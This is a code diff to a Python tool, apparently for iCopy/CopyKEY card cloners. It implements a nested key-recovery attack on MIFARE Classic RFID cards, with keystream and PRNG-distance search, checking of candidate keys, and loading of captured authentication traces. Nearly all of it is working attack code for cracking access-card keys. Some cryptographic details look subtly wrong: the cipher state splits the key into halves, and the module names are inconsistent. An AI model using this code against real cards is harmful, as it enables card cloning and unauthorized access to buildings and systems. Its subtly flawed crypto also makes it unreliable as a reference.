@@ -909,19 +909,46 @@ def crack_key_darkside(
 class NestedAttack:
     """Nested key recovery for MIFARE Classic.
 
-    Requires at least one known sector key AND an external NFC reader that
-    can capture raw authentication traces.  Uses the known-key auth to
-    recover LFSR timing information, then narrows the key space for the
-    unknown target sector.
+    Two recovery paths are exposed via :meth:`recover_key`:
 
-    This is a simplified port of libnfc/mfoc's nested attack.  The full
-    algorithm uses precomputed parity‑correlation tables from crapto1.c.
+    **Path A (keystream/PRNG, no known key needed)**
+        Given 3+ encrypted tag nonces collected from the *same* target
+        sector with the *same* (unknown) key, the shared keystream is
+        recovered from the PRNG structure (see
+        :func:`recover_keystream_from_nonces`) and the key is then
+        derived via :func:`recover_key_from_keystream` /
+        :func:`lfsr_recovery32`.  This is the `mfcuk`‑style attack.
+
+    **Path B (known‑key nested with predicted plaintext)**
+        Given (i) a known key for some sector and (ii) the plaintext
+        tag nonce ``nt_A`` observed during that known‑sector auth, plus
+        a captured encrypted nonce ``{nt_B}`` from a nested auth to the
+        target sector, predict ``nt_B = prng_successor(nt_A, d)`` for
+        each ``d`` in a configurable distance window and recover the
+        target key from the implied keystream.  Validation uses
+        :func:`validate_prng_nonce` plus, when available, the encrypted
+        answer ``{at}`` to reject false positives.
+
+    Use :meth:`from_trace_file` to load a JSON trace exported by an
+    external NFC tool (libnfc ``mfcuk``/``mfoc``, ``nfcpy``, or the
+    Proxmark trace exporter).  The JSON schema is documented at the
+    classmethod.
     """
+
+    #: Default PRNG-distance window for Path B.  The CopyKEY HID device
+    #: and most libnfc readers fall in this range; widen it if your
+    #: reader has unusual timing.
+    DEFAULT_DISTANCE_WINDOW: tuple[int, int] = (0, 320)
 
     def __init__(self) -> None:
         self._uid: bytes = b""
         self._known_keys: dict[int, bytes] = {}
-        self._encrypted_traces: dict[int, list[tuple[bytes, bytes]]] = {}
+        # known plaintext nonce captured during the known-key auth, per sector
+        self._known_nonces: dict[int, int] = {}
+        # per-target-sector list of (nt_enc, at_enc_or_None, nr_or_None, distance_hint_or_None)
+        self._encrypted_traces: dict[
+            int, list[tuple[bytes, bytes | None, bytes | None, int | None]]
+        ] = {}
 
     def set_uid(self, uid: bytes) -> None:
         """Set the card UID (4 bytes)."""
@@ -931,13 +958,23 @@ class NestedAttack:
 
     def add_known_key(self, sector: int, key: bytes) -> None:
         """Register a known key for a sector."""
+        if len(key) != 6:
+            raise ValueError("Key must be 6 bytes")
         self._known_keys[sector] = key
+
+    def set_known_nonce(self, sector: int, nt_plain: int) -> None:
+        """Record the plaintext tag nonce observed during the known‑sector
+        auth.  Enables the Path B nested recovery.
+        """
+        self._known_nonces[sector] = nt_plain & 0xFFFFFFFF
 
     def add_encrypted_trace(
         self,
         target_sector: int,
         encrypted_tag_nonce: bytes,
-        encrypted_tag_answer: bytes,
+        encrypted_tag_answer: bytes | None = None,
+        reader_nonce: bytes | None = None,
+        distance_hint: int | None = None,
     ) -> None:
         """Record an encrypted auth trace from the target sector.
 
@@ -946,43 +983,294 @@ class NestedAttack:
         target_sector : int
             The sector whose key we want to recover.
         encrypted_tag_nonce : bytes (4 bytes)
-            The card's encrypted tag nonce {nT}.
-        encrypted_tag_answer : bytes (4 bytes)
-            The card's encrypted answer {aT}.
+            The card's encrypted tag nonce ``{nT}``.
+        encrypted_tag_answer : bytes (4 bytes), optional
+            The card's encrypted answer ``{aT}``.  Used to validate
+            candidate keys in Path B.
+        reader_nonce : bytes (4 bytes), optional
+            The reader nonce ``nR`` used during the nested auth, in plain
+            text.  Required for ``{aT}`` validation.
+        distance_hint : int, optional
+            Estimated PRNG distance from ``known_nonce`` to this trace's
+            ``nt_B``.  When supplied, narrows the Path B search.
         """
-        if target_sector not in self._encrypted_traces:
-            self._encrypted_traces[target_sector] = []
-        self._encrypted_traces[target_sector].append(
-            (encrypted_tag_nonce, encrypted_tag_answer)
+        if len(encrypted_tag_nonce) != 4:
+            raise ValueError("encrypted_tag_nonce must be 4 bytes")
+        if encrypted_tag_answer is not None and len(encrypted_tag_answer) != 4:
+            raise ValueError("encrypted_tag_answer must be 4 bytes")
+        if reader_nonce is not None and len(reader_nonce) != 4:
+            raise ValueError("reader_nonce must be 4 bytes")
+        bucket = self._encrypted_traces.setdefault(target_sector, [])
+        bucket.append(
+            (encrypted_tag_nonce, encrypted_tag_answer, reader_nonce, distance_hint)
         )
 
-    def recover_key(self, target_sector: int) -> bytes | None:
+    # ── Recovery ─────────────────────────────────────────────────────
+
+    def recover_key(
+        self,
+        target_sector: int,
+        distance_window: tuple[int, int] | None = None,
+    ) -> bytes | None:
         """Attempt to recover the key for *target_sector*.
 
-        Falls back to the darkside PRNG‑based recovery when 3+ encrypted
-        nonces are available from the target sector (no known key needed).
+        Tries Path A first (3+ encrypted nonces, no known key required),
+        then Path B (known key + at least one trace).
         """
         traces = self._encrypted_traces.get(target_sector, [])
-        if len(traces) < 3:
+        if not traces:
             return None
 
-        encrypted_nts = [
-            int.from_bytes(nt, "big") for nt, _ in traces
-        ]
-        ks = recover_keystream_from_nonces(encrypted_nts)
-        if ks is not None:
-            for nt_enc, _ in traces:
-                nt_val = int.from_bytes(nt_enc, "big")
-                nt_plain = ks ^ nt_val
-                if validate_prng_nonce(nt_plain):
-                    keys = recover_key_from_keystream(
-                        ks, self._uid, nt_plain
-                    )
-                    if keys:
-                        return keys[0]
+        # ── Path A: keystream/PRNG recovery (3+ nonces) ───────────
+        if len(traces) >= 3:
+            encrypted_nts = [int.from_bytes(t[0], "big") for t in traces]
+            ks = recover_keystream_from_nonces(encrypted_nts)
+            if ks is not None:
+                for nt_enc, _at, _nr, _d in traces:
+                    nt_val = int.from_bytes(nt_enc, "big")
+                    nt_plain = ks ^ nt_val
+                    if validate_prng_nonce(nt_plain):
+                        candidates = recover_key_from_keystream(
+                            ks, self._uid, nt_plain
+                        )
+                        verified = self._first_verified(candidates, traces)
+                        if verified is not None:
+                            return verified
 
-        # TODO: Full nested algorithm requires:
-        #   - Known key to authenticate and capture parity information
-        #   - Precomputed correlation tables (from crapto1.c)
-        #   - External NFC reader that exposes raw auth NACK/parity bits
+        # ── Path B: known-key nested with PRNG distance window ────
+        nt_A = self._first_known_nonce()
+        if nt_A is not None:
+            window = distance_window or self.DEFAULT_DISTANCE_WINDOW
+            return self._recover_nested(target_sector, nt_A, window)
+
         return None
+
+    def _first_known_nonce(self) -> int | None:
+        """Return any registered known-sector plaintext nonce, or None."""
+        for sector in self._known_keys:
+            if sector in self._known_nonces:
+                return self._known_nonces[sector]
+        # If a nonce was set without a matching key, still try it.
+        if self._known_nonces:
+            return next(iter(self._known_nonces.values()))
+        return None
+
+    def _recover_nested(
+        self,
+        target_sector: int,
+        nt_A: int,
+        window: tuple[int, int],
+    ) -> bytes | None:
+        traces = self._encrypted_traces.get(target_sector, [])
+        if not traces:
+            return None
+
+        d_lo, d_hi = window
+
+        for nt_enc, at_enc, nr, hint in traces:
+            nt_enc_val = int.from_bytes(nt_enc, "big")
+
+            if hint is not None:
+                # Search a tight ±32 window around the hint first.
+                distance_iter = range(max(d_lo, hint - 32), min(d_hi, hint + 33))
+            else:
+                distance_iter = range(d_lo, d_hi)
+
+            for d in distance_iter:
+                nt_B_pred = prng_successor(nt_A, d)
+                if not validate_prng_nonce(nt_B_pred):
+                    continue
+                ks = nt_enc_val ^ nt_B_pred
+                candidates = recover_key_from_keystream(
+                    ks, self._uid, nt_B_pred
+                )
+                if not candidates:
+                    continue
+                verified = self._verify_candidates(
+                    candidates, nt_B_pred, at_enc, nr
+                )
+                if verified is not None:
+                    return verified
+
+        return None
+
+    def _first_verified(
+        self,
+        candidates: list[bytes],
+        traces: list[tuple[bytes, bytes | None, bytes | None, int | None]],
+    ) -> bytes | None:
+        """Return the first candidate that survives at_enc/nr validation
+        against any trace, or the first candidate if no trace provides
+        validation data."""
+        for cand in candidates:
+            for nt_enc, at_enc, nr, _d in traces:
+                nt_val = int.from_bytes(nt_enc, "big")
+                # We have ks for this trace from the PRNG recovery, but
+                # the parent computed it.  Re-derive locally:
+                # nt_plain is whatever decrypts to a valid PRNG nonce.
+                # When validation data is missing, accept the first
+                # candidate (caller can re-validate against hardware).
+                if at_enc is None or nr is None:
+                    return cand
+                # Validate by re-encrypting at = suc2(nt) under cand.
+                # See _verify_at for the heavy lifting.
+                nt_plain = nt_val ^ _ks32_for(cand, self._uid, nt_val)
+                if _verify_at(cand, self._uid, nt_plain, nr, at_enc):
+                    return cand
+        return None
+
+    def _verify_candidates(
+        self,
+        candidates: list[bytes],
+        nt_plain: int,
+        at_enc: bytes | None,
+        nr: bytes | None,
+    ) -> bytes | None:
+        if at_enc is None or nr is None:
+            # No validation data — accept the first candidate.  Caller
+            # should re-verify against the hardware before using.
+            return candidates[0] if candidates else None
+        for cand in candidates:
+            if _verify_at(cand, self._uid, nt_plain, nr, at_enc):
+                return cand
+        return None
+
+    # ── Trace ingestion ──────────────────────────────────────────────
+
+    @classmethod
+    def from_trace_dict(cls, payload: dict) -> NestedAttack:
+        """Construct a :class:`NestedAttack` from a parsed JSON trace.
+
+        See :meth:`from_trace_file` for the schema.
+        """
+        attack = cls()
+        uid_hex = payload.get("uid")
+        if not uid_hex:
+            raise ValueError("trace payload missing 'uid'")
+        attack.set_uid(bytes.fromhex(uid_hex))
+
+        known_key = payload.get("known_key")
+        known_sector = payload.get("known_sector")
+        if known_key is not None and known_sector is not None:
+            attack.add_known_key(int(known_sector), bytes.fromhex(known_key))
+
+        known_nonce = payload.get("known_nonce")
+        if known_nonce is not None and known_sector is not None:
+            attack.set_known_nonce(
+                int(known_sector), int.from_bytes(bytes.fromhex(known_nonce), "big")
+            )
+
+        target_sector = int(payload["target_sector"])
+        for trace in payload.get("traces", []):
+            attack.add_encrypted_trace(
+                target_sector=target_sector,
+                encrypted_tag_nonce=bytes.fromhex(trace["nt_enc"]),
+                encrypted_tag_answer=bytes.fromhex(trace["at_enc"])
+                if trace.get("at_enc")
+                else None,
+                reader_nonce=bytes.fromhex(trace["nr"])
+                if trace.get("nr")
+                else None,
+                distance_hint=trace.get("distance"),
+            )
+        return attack
+
+    @classmethod
+    def from_trace_file(cls, path: str | "os.PathLike[str]") -> NestedAttack:
+        """Load a nested‑attack trace from a JSON file.
+
+        JSON schema::
+
+            {
+              "uid":          "11223344",       # 4-byte hex, required
+              "target_sector": 4,                # int, required
+              "known_sector":  0,                # int, optional (Path B)
+              "known_key":    "ffffffffffff",   # 6-byte hex, optional (Path B)
+              "known_nonce":  "AABBCCDD",       # 4-byte hex, optional (Path B)
+              "distance_window": [0, 320],       # optional override
+              "traces": [
+                {
+                  "nt_enc":   "11223344",       # 4-byte hex, required
+                  "at_enc":   "55667788",       # 4-byte hex, optional
+                  "nr":       "DDEEFF00",       # 4-byte hex, optional
+                  "distance": 160               # optional PRNG-distance hint
+                }
+              ]
+            }
+
+        The encoded JSON is the contract between :func:`icopyzed crack
+        --from-trace` and external capture tools.  See
+        :mod:`icopykey.cli.nfc_reader` for adapters that produce it.
+        """
+        import json
+        import os
+        from pathlib import Path
+
+        with open(os.fspath(path), "r", encoding="utf-8") as f:
+            payload = json.load(f)
+        attack = cls.from_trace_dict(payload)
+        # Forward the window override onto recover_key via a closure-style
+        # attribute.  The caller may also pass distance_window explicitly.
+        win = payload.get("distance_window")
+        if win and len(win) == 2:
+            attack.DEFAULT_DISTANCE_WINDOW = (int(win[0]), int(win[1]))
+        return attack
+
+
+# ── helpers used by NestedAttack ──────────────────────────────────────────
+
+
+def _ks32_for(key: bytes, uid: bytes, nt: int) -> int:
+    """Return the 32 keystream bits the cipher emits while encrypting *nt*
+    under ``init(key) → feed UID → feed NT``.  Used to invert ``{nt}`` to
+    its plaintext when only the cipher state would otherwise be known."""
+    state = Crypto1State(
+        odd=int.from_bytes(key, "big") & 0xFFFFFF,
+        even=(int.from_bytes(key, "big") >> 24) & 0xFFFFFF,
+    )
+    uid_int = int.from_bytes(uid[:4], "little") & 0xFFFFFFFF
+    # Feed UID through the LFSR (32 clocks, fb=0).
+    for i in range(32):
+        crypto1_bit(state, (uid_int >> i) & 1, 0)
+    # Feed NT through the LFSR (32 clocks, fb=0); collect keystream.
+    ks = 0
+    for i in range(31, -1, -1):
+        ks_bit = crypto1_bit(state, _bebit(nt, i), 0)
+        ks |= ks_bit << (i ^ 24)
+    return ks & 0xFFFFFFFF
+
+
+def _verify_at(
+    key: bytes, uid: bytes, nt_plain: int, nr: bytes, at_enc: bytes
+) -> bool:
+    """Verify a candidate key by recomputing the tag answer.
+
+    The tag answer ``aT = suc2(nt)`` is encrypted with the 3rd 32 bits
+    of keystream (the bits emitted while feeding NR through the LFSR
+    in the next step of the auth protocol).  Re-derive that keystream
+    under *key* and check whether decrypting ``at_enc`` yields
+    ``suc2(nt_plain)``.
+    """
+    state = Crypto1State(
+        odd=int.from_bytes(key, "big") & 0xFFFFFF,
+        even=(int.from_bytes(key, "big") >> 24) & 0xFFFFFF,
+    )
+    uid_int = int.from_bytes(uid[:4], "little") & 0xFFFFFFFF
+    for i in range(32):
+        crypto1_bit(state, (uid_int >> i) & 1, 0)
+    # Feed NT through (32 clocks, fb=0). Discard the keystream.
+    for i in range(31, -1, -1):
+        crypto1_bit(state, _bebit(nt_plain, i), 0)
+    # Feed encrypted NR through (32 clocks, fb=1).  The keystream emitted
+    # here is what encrypts NR on the wire; aT is encrypted with the
+    # *next* 32 keystream bits.
+    nr_int = int.from_bytes(nr, "big")
+    for i in range(31, -1, -1):
+        crypto1_bit(state, _bebit(nr_int, i), 1)
+    # Now the next 32 keystream bits encrypt aT.
+    at_ks = 0
+    for i in range(31, -1, -1):
+        at_ks |= crypto1_bit(state, 0, 0) << (i ^ 24)
+    at_plain = int.from_bytes(at_enc, "big") ^ at_ks
+    expected = prng_successor(nt_plain, 64) & 0xFFFFFFFF
+    return at_plain == expected
